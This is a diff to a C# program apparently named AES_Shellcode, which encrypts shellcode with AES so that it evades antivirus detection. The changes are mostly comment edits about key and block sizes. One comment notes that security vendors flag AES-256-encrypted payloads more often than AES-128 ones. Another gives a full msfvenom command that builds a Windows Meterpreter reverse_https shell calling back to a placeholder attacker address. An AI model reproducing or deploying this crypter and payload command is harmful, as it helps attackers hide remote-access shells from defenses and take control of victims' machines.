@@ -47,11 +47,14 @@ namespace AES_Shellcode
         {
             using (var aes = Aes.Create())
             {
-                // Some vendors flag payloads more that use 256 vs 128. Something to keep in mind.
+                // 128-bit / 192-bit / 256-bit
+                // I found that some vendors flag payloads more that use 256 vs 128. Something to keep in mind.
                 aes.KeySize = 128;
-                aes.BlockSize = 128;
-                aes.Padding = PaddingMode.Zeros;
 
+                // AES is a 128-bit block cipher so this won't change between 128-bit/192-bit/256-bit keys
+                aes.BlockSize = 128;
+
+                aes.Padding = PaddingMode.Zeros;
                 aes.Key = key;
                 aes.IV = iv;
 
@@ -99,7 +102,7 @@ namespace AES_Shellcode
             // 16 Bytes > AES-128 | 24 Bytes > AES-192 | 32 Bytes > AES-256
             byte[] keyBytes = RandomBytes(16);
 
-            // This does not change if you move to AES-256
+            // This does not change between different key lengths
             byte[] ivBytes = RandomBytes(16);
 
             // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f csharp -v payload
